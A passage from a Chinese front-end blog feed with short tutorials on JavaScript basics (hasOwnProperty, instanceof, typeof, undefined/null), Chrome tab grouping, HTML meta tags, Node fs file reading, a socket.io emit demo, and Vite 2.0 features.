<p>这里主要分享了5个知识点，一个是函数组件与类组件的区别，一个是useState, 再一个useEffect（后面会详细说）,然后介绍了闭包，最后说明了useReducer的使用，相信认真看到这里的小伙伴对于React的Hooks已经有了个初步了解，并且对闭包不熟悉的小伙伴也已经对闭包有了深入认识吧。</p>
</blockquote>
<blockquote>
<p>作者：king王一帅<br>链接：<a href="https://juejin.cn/post/6844903830841196552">https://juejin.cn/post/6844903830841196552</a></p>
</blockquote>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>chrome新增功能：分组和排列</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/chrome%E6%96%B0%E5%A2%9E%E5%8A%9F%E8%83%BD%EF%BC%9A%E5%88%86%E7%BB%84%E5%92%8C%E6%8E%92%E5%88%97/</url>
    <content><![CDATA[<h2 id="标签页分组"><a href="#标签页分组" class="headerlink" title="标签页分组"></a>标签页分组</h2><hr>
<p>当打开多个标签页时遇到需要对打开的标签页进行管理， Google 加入了对标签页分组这项新功能，通过将相同类型的标签页放置在同一标签页组内，通过颜色名称等标记标签页栏，从而将不同的标签页明显地区别出来，对比此前都是同一颜色的标签页，显然在使用上要高效得多。<br><img src="https://upload-images.jianshu.io/upload_images/10024246-4ce13c576433f407.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<h5 id="为标签页分组"><a href="#为标签页分组" class="headerlink" title="为标签页分组"></a>为标签页分组</h5><ol>
<li> 打开 <a href="https://chrome.google.com/">Chrome 浏览器</a>。</li>
<li> 点击“打开新的标签页”按钮 </li>
<li>根据需要执行相应操作：<ul>
<li>  要将某个标签页添加到现有群组，请将此标签页拖入该群组。</li>
<li>要将某个标签页添加到新的群组中，请执行以下操作：<ol>
<li>点击“打开新的标签页”按钮 <br>  右键点击相应标签页 <br>  选择<strong>向新群组中添加标签页</strong>。</li>
<li> 输入群组名称。</li>
<li>（可选）您还可以执行以下操作：<ul>
<li>  为相应标签页选择一种颜色。</li>
<li>  向该群组添加更多标签页。</li>
<li>  移除该群组。</li>
</ul>
</li>
</ol>
</li>
</ul>
</li>
</ol>
<h3 id="排列标签页"><a href="#排列标签页" class="headerlink" title="排列标签页"></a>排列标签页</h3><ul>
<li>  <strong>要更改标签页的排列顺序</strong>，请沿浏览器窗口顶部拖动标签页。</li>
<li>  <strong>要将某个标签页固定到左侧</strong>，请右键点击该标签页，然后选择<strong>固定</strong>。已固定标签页的尺寸较小，并且只显示网站的图标。</li>
<li>  <strong>要取消固定某个标签页</strong>，请右键点击该标签页，然后选择<strong>取消固定</strong>。</li>
<li>  <strong>要将标签页移到其他窗口</strong>，请右键点击该标签页，然后选择<strong>将标签页移至新窗口</strong>。</li>
</ul>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>hasOwnProperty 函数</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/hasOwnProperty%E5%87%BD%E6%95%B0/</url>
    <content><![CDATA[<p>为了判断一个对象是否包含<em>自定义</em>属性而<em>不是</em>原型链上的属性， 我们需要使用继承自 <code>Object.prototype</code> 的 <code>hasOwnProperty</code> 方法。</p>
<p><strong>注意:</strong> 通过判断一个属性是否 <code>undefined</code> 是<strong>不够</strong>的。 因为一个属性可能确实存在，只不过它的值被设置为 <code>undefined</code>。</p>
<p><code>hasOwnProperty</code> 是 JavaScript 中唯一一个处理属性但是<strong>不</strong>查找原型链的函数。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 修改Object.prototype</span><br><span class="line">Object.prototype.bar &#x3D; 1; </span><br><span class="line">var foo &#x3D; &#123;goo: undefined&#125;;</span><br><span class="line"></span><br><span class="line">foo.bar; &#x2F;&#x2F; 1</span><br><span class="line">&#39;bar&#39; in foo; &#x2F;&#x2F; true</span><br><span class="line"></span><br><span class="line">foo.hasOwnProperty(&#39;bar&#39;); &#x2F;&#x2F; false</span><br><span class="line">foo.hasOwnProperty(&#39;goo&#39;); &#x2F;&#x2F; true</span><br></pre></td></tr></table></figure>

<p>只有 <code>hasOwnProperty</code> 可以给出正确和期望的结果，这在遍历对象的属性时会很有用。 <strong>没有</strong>其它方法可以用来排除原型链上的属性，而不是定义在对象<em>自身</em>上的属性。</p>
<h3 id="hasOwnProperty-作为属性"><a href="#hasOwnProperty-作为属性" class="headerlink" title="hasOwnProperty 作为属性"></a><code>hasOwnProperty</code> 作为属性</h3><p>JavaScript <strong>不会</strong>保护 <code>hasOwnProperty</code> 被非法占用，因此如果一个对象碰巧存在这个属性， 就需要使用<em>外部</em>的 <code>hasOwnProperty</code> 函数来获取正确的结果。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var foo &#x3D; &#123;</span><br><span class="line">    hasOwnProperty: function() &#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;,</span><br><span class="line">    bar: &#39;Here be dragons&#39;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">foo.hasOwnProperty(&#39;bar&#39;); &#x2F;&#x2F; 总是返回 false</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 使用其它对象的 hasOwnProperty，并将其上下文设置为foo</span><br><span class="line">(&#123;&#125;).hasOwnProperty.call(foo, &#39;bar&#39;); &#x2F;&#x2F; true</span><br></pre></td></tr></table></figure>

<h3 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h3><p>当检查对象上某个属性是否存在时，<code>hasOwnProperty</code> 是<strong>唯一</strong>可用的方法。 同时在使用 <code>for in</code> loop遍历对象时，推荐<strong>总是</strong>使用 <code>hasOwnProperty</code> 方法， 这将会避免<code>原型</code>对象扩展带来的干扰。</p>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>instanceof 操作符</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/instanceof%E6%93%8D%E4%BD%9C%E7%AC%A6/</url>
    <content><![CDATA[<p><code>instanceof</code> 操作符用来比较两个操作数的构造函数。只有在比较自定义的对象时才有意义。 如果用来比较内置类型，将会和 <a href="http://bonsaiden.github.io/JavaScript-Garden/zh/#types.typeof"><code>typeof</code> 操作符</a> 一样用处不大。</p>
<h3 id="比较自定义对象"><a href="#比较自定义对象" class="headerlink" title="比较自定义对象"></a>比较自定义对象</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function Foo() &#123;&#125;</span><br><span class="line">function Bar() &#123;&#125;</span><br><span class="line">Bar.prototype &#x3D; new Foo();</span><br><span class="line"></span><br><span class="line">new Bar() instanceof Bar; &#x2F;&#x2F; true</span><br><span class="line">new Bar() instanceof Foo; &#x2F;&#x2F; true</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 如果仅仅设置 Bar.prototype 为函数 Foo 本身，而不是 Foo 构造函数的一个实例</span><br><span class="line">Bar.prototype &#x3D; Foo;</span><br><span class="line">new Bar() instanceof Foo; &#x2F;&#x2F; false</span><br></pre></td></tr></table></figure>

<h3 id="instanceof-比较内置类型"><a href="#instanceof-比较内置类型" class="headerlink" title="instanceof 比较内置类型"></a><code>instanceof</code> 比较内置类型</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">new String(&#39;foo&#39;) instanceof String; &#x2F;&#x2F; true</span><br><span class="line">new String(&#39;foo&#39;) instanceof Object; &#x2F;&#x2F; true</span><br><span class="line"></span><br><span class="line">&#39;foo&#39; instanceof String; &#x2F;&#x2F; false</span><br><span class="line">&#39;foo&#39; instanceof Object; &#x2F;&#x2F; false</span><br></pre></td></tr></table></figure>

<p>有一点需要注意，<code>instanceof</code> 用来比较属于不同 JavaScript 上下文的对象（比如，浏览器中不同的文档结构）时将会出错， 因为它们的构造函数不会是同一个对象。</p>
<h3 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h3><p><code>instanceof</code> 操作符应该<strong>仅仅</strong>用来比较来自同一个 JavaScript 上下文的自定义对象。 正如 <a href="http://bonsaiden.github.io/JavaScript-Garden/zh/#types.typeof"><code>typeof</code></a> 操作符一样，任何其它的用法都应该是避免的。</p>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>meta基础知识</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/meta%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
    <content><![CDATA[<p><strong>H5页面窗口自动调整到设备宽度，并禁止用户缩放页面</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width,initial-scale&#x3D;1.0,minimum-scale&#x3D;1.0,maximum-scale&#x3D;1.0,user-scalable&#x3D;no&quot; &#x2F;&gt;</span><br></pre></td></tr></table></figure>

<p><strong>忽略将页面中的数字识别为电话号码</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">name&#x3D;&quot;format-detection&quot; content&#x3D;&quot;telephone&#x3D;no&quot; &#x2F;&gt;</span><br></pre></td></tr></table></figure>

<p><strong>忽略<code>Android</code>平台中对邮箱地址的识别</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">name&#x3D;&quot;format-detection&quot; content&#x3D;&quot;email&#x3D;no&quot; &#x2F;&gt;</span><br></pre></td></tr></table></figure>

<p><strong>当网站添加到主屏幕快速启动方式，可隐藏地址栏，仅针对<code>ios</code>的safari</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">name&#x3D;&quot;apple-mobile-web-app-capable&quot; content&#x3D;&quot;yes&quot; &#x2F;&gt;</span><br></pre></td></tr></table></figure>

<p><strong>将网站添加到主屏幕快速启动方式，仅针对ios的safari顶端状态条的样式</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">name&#x3D;&quot;apple-mobile-web-app-status-bar-style&quot; content&#x3D;&quot;black&quot; &#x2F;&gt;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>Nodejs读取目录下的文件并编辑</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/nodereadfile/</url>
    <content><![CDATA[<p>node下读取和编辑文件都是使用<code>fs</code>组件</p>
<h2 id="引用模块"><a href="#引用模块" class="headerlink" title="引用模块"></a>引用模块</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">const fs &#x3D; require(&#39;fs&#39;);</span><br></pre></td></tr></table></figure>
<h2 id="读取文件夹"><a href="#读取文件夹" class="headerlink" title="读取文件夹"></a>读取文件夹</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line">* path - 文件路径。</span><br><span class="line">* callback - 回调函数，回调函数带有两个参数err, files，err 为错误信息，files 为 目录下的文件数组列表。</span><br><span class="line">**&#x2F;</span><br><span class="line"></span><br><span class="line">fs.readdir(path, callback)</span><br><span class="line">#异步 readdir(3). 读取目录的内容。</span><br><span class="line">fs.readdirSync(path)</span><br><span class="line">#同步 readdir().返回文件数组列表。</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;demo</span><br><span class="line">const fs &#x3D; require(&#39;fs&#39;);</span><br><span class="line">const path &#x3D; require(&#39;path&#39;);</span><br><span class="line">fs.readdir(pathName, function(err, files)&#123;</span><br><span class="line">    var dirs &#x3D; [];</span><br><span class="line">    (function iterator(i)&#123;</span><br><span class="line">      if(i &#x3D;&#x3D; files.length) &#123;</span><br><span class="line">        console.log(dirs);</span><br><span class="line">      &#125;</span><br><span class="line">      fs.stat(path.join(pathName, files[i]), function(err, data)&#123;     </span><br><span class="line">        if(data.isFile())&#123;               </span><br><span class="line">            dirs.push(files[i]);</span><br><span class="line">            iterator(i+1);</span><br><span class="line">       &#125;);   </span><br><span class="line">    &#125;)(0);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h2 id="编辑文件"><a href="#编辑文件" class="headerlink" title="编辑文件"></a>编辑文件</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var fs &#x3D; require(&quot;fs&quot;);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 异步读取</span><br><span class="line">fs.readFile(&#39;input.txt&#39;, function (err, data) &#123;</span><br><span class="line">   if (err) &#123;</span><br><span class="line">       return console.error(err);</span><br><span class="line">   &#125;</span><br><span class="line">   console.log(&quot;异步读取: &quot; + data.toString());</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 同步读取</span><br><span class="line">var data &#x3D; fs.readFileSync(&#39;input.txt&#39;);</span><br><span class="line">console.log(&quot;同步读取: &quot; + data.toString());</span><br><span class="line"></span><br><span class="line">console.log(&quot;程序执行完毕。&quot;);</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>socke.io.emit 方法</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/socke_io_emit/</url>
    <content><![CDATA[<p>emit可以很方便的发送数据,例如：</p>
<ul>
<li><p>socket.emit(‘action’):<br>表示发送了一个action命令，命令是字符串的，在另一端接收时，可以这么写： socket.on(‘action’,function(){…});</p>
</li>
<li><p>socket.emit(‘action’,data)<br>表示发送了一个action命令，还有data数据，在另一端接收时，可以这么写： socket.on(‘action’,function(data){…});</p>
</li>
<li><p>socket.emit(action,arg1,arg2)<br>表示发送了一个action命令，还有两个数据，在另一端接收时，可以这么写： socket.on(‘action’,function(arg1,arg2){…});</p>
</li>
<li><p>socket.emit(action,arg1,arg2,arg3,arg4); 是多个参数<br>在emit方法中包含回调函数，例如：</p>
</li>
<li><p>socket.emit(‘action’,data, function(arg1,arg2){…} );<br>回调函数可以在另一端调用，另一端可以这么写：socket.on(‘action’,function(data,fn){   fn(‘a’,’b’) ;  });</p>
</li>
</ul>
<p>上面的data数据可以有0个或者多个，相应的在另一端改变function中参数的个数即可，function中的参数个数和顺序应该和发送时一致<br>上面的fn表示另一个端传递过来的参数，是个函数，写fn(‘a’,’b’) ;会回调函数执行。一次发送不应该写多个回调，否则只有最后一个起效，回调应作为最后一个参数。</p>
<p>例子：一个js文件(内容是下面的服务器端)，同一目录下放一个helloworld.html文件(内容是下面的客户端)，启动服务器，访问<a href="http://127.0.0.1/">http://127.0.0.1/</a></p>
<h5 id="客户端："><a href="#客户端：" class="headerlink" title="客户端："></a>客户端：</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE HTML PUBLIC &quot;-&#x2F;&#x2F;W3C&#x2F;&#x2F;DTD HTML 4.01 Transitional&#x2F;&#x2F;EN&quot; &quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;html4&#x2F;loose.dtd&quot;&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line"> &lt;head&gt;</span><br><span class="line">  &lt;title&gt; New Document &lt;&#x2F;title&gt;</span><br><span class="line">  &lt;meta name&#x3D;&quot;Generator&quot; content&#x3D;&quot;EditPlus&quot;&gt;</span><br><span class="line">  &lt;meta name&#x3D;&quot;Author&quot; content&#x3D;&quot;&quot;&gt;</span><br><span class="line">  &lt;meta name&#x3D;&quot;Keywords&quot; content&#x3D;&quot;&quot;&gt;</span><br><span class="line">  &lt;meta name&#x3D;&quot;Description&quot; content&#x3D;&quot;&quot;&gt;</span><br><span class="line"> &lt;&#x2F;head&gt;</span><br><span class="line">	&lt;script src&#x3D;&quot;&#x2F;socket.io&#x2F;socket.io.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">  var socket &#x3D; io.connect(&#39;ws:&#x2F;&#x2F;127.0.0.1&#x2F;&#39;);</span><br><span class="line">  socket.emit(&#39;msg&#39;,&#39;You get my message?&#39;,function(data)&#123;</span><br><span class="line">    alert(data);</span><br><span class="line">   &#125;); </span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"> &lt;body&gt;</span><br><span class="line"> </span><br><span class="line"> &lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<h5 id="服务器端："><a href="#服务器端：" class="headerlink" title="服务器端："></a>服务器端：</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var server&#x3D;require(&#39;http&#39;).createServer(handler); </span><br><span class="line">var io &#x3D; require(&#39;socket.io&#39;).listen(server);</span><br><span class="line">var fs&#x3D;require(&#39;fs&#39;);</span><br><span class="line">server.listen(80);</span><br><span class="line">function handler(req,res)&#123;</span><br><span class="line">	fs.readFile(__dirname+&#39;&#x2F;helloworld.html&#39;,</span><br><span class="line">	function(err, data)&#123;</span><br><span class="line">		if(err)&#123;</span><br><span class="line">			res.writeHead(500);</span><br><span class="line">			return res.end(&#39;Error loading index.html&#39;);</span><br><span class="line">		&#125;</span><br><span class="line">		res.writeHead(200);</span><br><span class="line">		res.end(data);</span><br><span class="line">	&#125;);</span><br><span class="line">&#125;</span><br><span class="line">io.sockets.on(&#39;connection&#39;, function (socket) &#123;</span><br><span class="line">	  socket.on(&#39;msg&#39;, function (data,fn) &#123;</span><br><span class="line">		console.log(&#39;received message from client:&#39;+data);</span><br><span class="line">		fn(&#39;The server has been successfully received your message:&#39;+data);</span><br><span class="line">	  &#125;); </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>typeof 操作符</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/typeof%E6%93%8D%E4%BD%9C%E7%AC%A6/</url>
    <content><![CDATA[<p><code>typeof</code> 操作符（和 <code>instanceof</code>一起）或许是 JavaScript 中最大的设计缺陷， 因为几乎不可能从它们那里得到想要的结果。</p>
<p>尽管 <code>instanceof</code> 还有一些极少数的应用场景，<code>typeof</code> 只有一个实际的应用（这个实际应用是用来检测一个对象是否已经定义或者是否已经赋值）， 而这个应用却<strong>不是</strong>用来检查对象的类型。</p>
<p><strong>注意:</strong> 由于 <code>typeof</code> 也可以像函数的语法被调用，比如 <code>typeof(obj)</code>，但这并不是一个函数调用。 那两个小括号只是用来计算一个表达式的值，这个返回值会作为 <code>typeof</code> 操作符的一个操作数。 实际上<strong>不存在</strong>名为 <code>typeof</code> 的函数。</p>
<h3 id="JavaScript-类型表格"><a href="#JavaScript-类型表格" class="headerlink" title="JavaScript 类型表格"></a>JavaScript 类型表格</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Value               Class      Type</span><br><span class="line">-------------------------------------</span><br><span class="line">&quot;foo&quot;               String     string</span><br><span class="line">new String(&quot;foo&quot;)   String     object</span><br><span class="line">1.2                 Number     number</span><br><span class="line">new Number(1.2)     Number     object</span><br><span class="line">true                Boolean    boolean</span><br><span class="line">new Boolean(true)   Boolean    object</span><br><span class="line">new Date()          Date       object</span><br><span class="line">new Error()         Error      object</span><br><span class="line">[1,2,3]             Array      object</span><br><span class="line">new Array(1, 2, 3)  Array      object</span><br><span class="line">new Function(&quot;&quot;)    Function   function</span><br><span class="line">&#x2F;abc&#x2F;g              RegExp     object (function in Nitro&#x2F;V8)</span><br><span class="line">new RegExp(&quot;meow&quot;)  RegExp     object (function in Nitro&#x2F;V8)</span><br><span class="line">&#123;&#125;                  Object     object</span><br><span class="line">new Object()        Object     object</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>上面表格中，<em>Type</em> 一列表示 <code>typeof</code> 操作符的运算结果。可以看到，这个值在大多数情况下都返回 “object”。</p>
<p><em>Class</em> 一列表示对象的内部属性 <code>[[Class]]</code> 的值。</p>
<p><strong>JavaScript 标准文档中定义:</strong> <code>[[Class]]</code> 的值只可能是下面字符串中的一个： <code>Arguments</code>, <code>Array</code>, <code>Boolean</code>, <code>Date</code>, <code>Error</code>, <code>Function</code>, <code>JSON</code>, <code>Math</code>, <code>Number</code>, <code>Object</code>, <code>RegExp</code>, <code>String</code>.</p>
<p>为了获取对象的 <code>[[Class]]</code>，我们需要使用定义在 <code>Object.prototype</code> 上的方法 <code>toString</code>。</p>
<h3 id="对象的类定义"><a href="#对象的类定义" class="headerlink" title="对象的类定义"></a>对象的类定义</h3><p>JavaScript 标准文档只给出了一种获取 <code>[[Class]]</code> 值的方法，那就是使用 <code>Object.prototype.toString</code>。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function is(type, obj) &#123;</span><br><span class="line">    var clas &#x3D; Object.prototype.toString.call(obj).slice(8, -1);</span><br><span class="line">    return obj !&#x3D;&#x3D; undefined &amp;&amp; obj !&#x3D;&#x3D; null &amp;&amp; clas &#x3D;&#x3D;&#x3D; type;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">is(&#39;String&#39;, &#39;test&#39;); &#x2F;&#x2F; true</span><br><span class="line">is(&#39;String&#39;, new String(&#39;test&#39;)); &#x2F;&#x2F; true</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>上面例子中，<code>Object.prototype.toString</code> 方法被调用，this 被设置为了需要获取 <code>[[Class]]</code> 值的对象。</p>
<p><code>Object.prototype.toString</code> 返回一种标准格式字符串，所以上例可以通过 <code>slice</code> 截取指定位置的字符串，如下所示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Object.prototype.toString.call([])    &#x2F;&#x2F; &quot;[object Array]&quot;</span><br><span class="line">Object.prototype.toString.call(&#123;&#125;)    &#x2F;&#x2F; &quot;[object Object]&quot;</span><br><span class="line">Object.prototype.toString.call(2)    &#x2F;&#x2F; &quot;[object Number]&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>ES5 提示:</strong> 在 ECMAScript 5 中，为了方便，对 <code>null</code> 和 <code>undefined</code> 调用 <code>Object.prototype.toString</code> 方法， 其返回值由 <code>Object</code> 变成了 <code>Null</code> 和 <code>Undefined</code>。</p>
<h3 id="测试为定义变量"><a href="#测试为定义变量" class="headerlink" title="测试为定义变量"></a>测试为定义变量</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">typeof foo !&#x3D;&#x3D; &#39;undefined&#39;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>上面代码会检测 <code>foo</code> 是否已经定义；如果没有定义而直接使用会导致 <code>ReferenceError</code> 的异常。 这是 <code>typeof</code> 唯一有用的地方。</p>
<h3 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h3><p>为了检测一个对象的类型，强烈推荐使用 <code>Object.prototype.toString</code> 方法； 因为这是唯一一个可依赖的方式。正如上面表格所示，<code>typeof</code> 的一些返回值在标准文档中并未定义， 因此不同的引擎实现可能不同。</p>
<p>除非为了检测一个变量是否已经定义，我们应尽量避免使用 <code>typeof</code> 操作符。</p>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>undefined 和 null</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/undefined%E5%92%8Cnull/</url>
    <content><![CDATA[<p>JavaScript 有两个表示‘空’的值，其中比较有用的是 <code>undefined</code>。</p>
<h3 id="undefined-的值"><a href="#undefined-的值" class="headerlink" title="undefined 的值"></a><code>undefined</code> 的值</h3><p><code>undefined</code> 是一个值为 <code>undefined</code> 的类型。</p>
<p>这个语言也定义了一个全局变量，它的值是 <code>undefined</code>，这个变量也被称为 <code>undefined</code>。 但是这个变量<strong>不是</strong>一个常量，也不是一个关键字。这意味着它的<em>值</em>可以轻易被覆盖。<br>下面的情况会返回 <code>undefined</code> 值：</p>
<ul>
<li>  访问未修改的全局变量 <code>undefined</code>。</li>
<li>  由于没有定义 <code>return</code> 表达式的函数隐式返回。</li>
<li>  <code>return</code> 表达式没有显式的返回任何内容。</li>
<li>  访问不存在的属性。</li>
<li>  函数参数没有被显式的传递值。</li>
<li>  任何被设置为 <code>undefined</code> 值的变量。</li>
</ul>
<h3 id="处理-undefined-值的改变"><a href="#处理-undefined-值的改变" class="headerlink" title="处理 undefined 值的改变"></a>处理 <code>undefined</code> 值的改变</h3><p>由于全局变量 <code>undefined</code> 只是保存了 <code>undefined</code> 类型实际<em>值</em>的副本， 因此对它赋新值<strong>不会</strong>改变类型 <code>undefined</code> 的值。</p>
<p>然而，为了方便其它变量和 <code>undefined</code> 做比较，我们需要事先获取类型 <code>undefined</code> 的值。</p>
<p>为了避免可能对 <code>undefined</code> 值的改变，一个常用的技巧是使用一个传递到<a href="http://bonsaiden.github.io/JavaScript-Garden/zh/#function.scopes">匿名包装器</a>的额外参数。 在调用时，这个参数不会获取任何值。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var undefined &#x3D; 123;</span><br><span class="line">(function(something, foo, undefined) &#123;    </span><br><span class="line">&#x2F;&#x2F; 局部作用域里的 undefined 变量重新获得了 &#96;undefined&#96; 值</span><br><span class="line">&#125;)(&#39;Hello World&#39;, 42);</span><br></pre></td></tr></table></figure>

<p>另外一种达到相同目的方法是在函数内使用变量声明。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var undefined &#x3D; 123;</span><br><span class="line">(function(something, foo) &#123;</span><br><span class="line">    var undefined;    ...</span><br><span class="line">&#125;)(&#39;Hello World&#39;, 42);</span><br></pre></td></tr></table></figure>

<p>这里唯一的区别是，在压缩后并且函数内没有其它需要使用 <code>var</code> 声明变量的情况下，这个版本的代码会多出 4 个字节的代码。</p>
<h3 id="null-的用处"><a href="#null-的用处" class="headerlink" title="null 的用处"></a><code>null</code> 的用处</h3><p>JavaScript 中的 <code>undefined</code> 的使用场景类似于其它语言中的 <em>null</em>，实际上 JavaScript 中的 <code>null</code> 是另外一种数据类型。</p>
<p>它在 JavaScript 内部有一些使用场景（比如声明原型链的终结 <code>Foo.prototype = null</code>），但是大多数情况下都可以使用 <code>undefined</code> 来代替。</p>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>尤雨溪：Vite 2.0 正式发布！</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/%E5%B0%A4%E9%9B%A8%E6%BA%AA%EF%BC%9AVite2%E6%AD%A3%E5%BC%8F%E5%8F%91%E5%B8%83!/</url>
    <content><![CDATA[<h2 id="Vite是什么"><a href="#Vite是什么" class="headerlink" title="Vite是什么"></a><strong>Vite是什么</strong></h2><p><code>Vite</code> (法语单词“ fast”，发音为/vit/)是一种新型的前端构建工具，它可以显著改善前端的开发体验。它由两个主要部分组成:</p>
<ul>
<li>  一个通过本机 ES 模块提供源文件的开发服务器，具有丰富的内置特性和快得惊人的热模块替换(HMR)。</li>
<li>  一个构建命令，它将代码与 Rollup 捆绑在一起，后者预先配置为输出用于生产的高度优化的静态资产</li>
</ul>
<p>此外，<code>Vite</code> 通过其插件 <code>API</code> 和 <code>JavaScript API</code> 具有高度的扩展性，并提供全面的类型支持</p>
<h3 id="有多快？"><a href="#有多快？" class="headerlink" title="有多快？"></a><strong>有多快？</strong></h3><p>为了了解 <code>Vite</code> 的速度有多快，这里有一个视频比较了使用 Vite vs. create-React-app (CRA) 应用程序的过程:</p>
<p><a href="https://mp.weixin.qq.com/mp/readtemplate?t=pages/video_player_tmpl&auto=0&vid=wxv_1744059798674849795">视频地址</a></p>
<h2 id="关于Vite2"><a href="#关于Vite2" class="headerlink" title="关于Vite2"></a><strong>关于Vite2</strong></h2><p>这实际上是 <code>Vite</code> 的第一个稳定版本。也就是说，<code>Vite 2.0</code>比之前的版本有了很大的改进：</p>
<p><strong>多框架支持</strong></p>
<p><code>Vite 2.0</code>采用了一个更健壮的内部架构从头开始重新设计。现在它完全与框架无关，所有特定于框架的支持都委托给了插件。现在有 <code>Vue</code>、 <code>React</code>、 <code>Preact</code>、 <code>Lit Element</code> 和正在进行的 <code>Svelte</code> 的官方模板</p>
<h3 id="全新插件机制和-API"><a href="#全新插件机制和-API" class="headerlink" title="全新插件机制和 API"></a><strong><strong>全新插件机制和 API</strong></strong></h3><p>受到 <code>WMR</code> 的启发，新的插件系统扩展了 <code>Rollup</code> 的插件界面，并兼容许多 <code>Rollup</code> 插件。插件可以使用 <code>rollup</code> 兼容的钩子，以及额外的 <code>vite</code> 特定钩子和属性来调整 <code>vite</code> 专用行为(例如区分 dev 和 build 或 HMR 的自定义处理)</p>
<h3 id="基于-esbuild-的依赖预打包"><a href="#基于-esbuild-的依赖预打包" class="headerlink" title="基于 esbuild 的依赖预打包"></a><strong><strong>基于 esbuild 的依赖预打包</strong></strong></h3><p>因为 <code>Vite</code> 是一个本地的 <code>ESM</code> dev 服务器，使用<code>Pre-Bundling</code>以减少浏览器请求的数量并处理 <code>CommonJS</code> 到 <code>ESM</code> 的转换</p>
<p>在之前，<code>Vite</code> 使用 <code>Rollup</code> 完成这项工作，而在2.0中，它现在使用 <code>esbuild</code>，从而使依赖性预绑定的速度提高了<strong>「10-100」</strong>倍</p>
<p>作为参考，<code>React Meterial</code> 用户界面以前需要28秒，现在需要约1.5秒</p>
<h3 id="更好的-CSS-支持"><a href="#更好的-CSS-支持" class="headerlink" title="更好的 CSS 支持"></a><strong><strong>更好的 CSS 支持</strong></strong></h3><p>将 <code>CSS</code> 视为<code>module</code>的<code>First-class</code>，并支持以下开箱即用的功能:</p>
<ul>
<li>  Resolver enhancement 增强了 CSS 中的路径，以尊重别名和 npm 依赖</li>
<li>  URL rebasing 不管文件从哪里导入，路径都会自动重新设置</li>
<li>  CSS code splitting</li>
</ul>
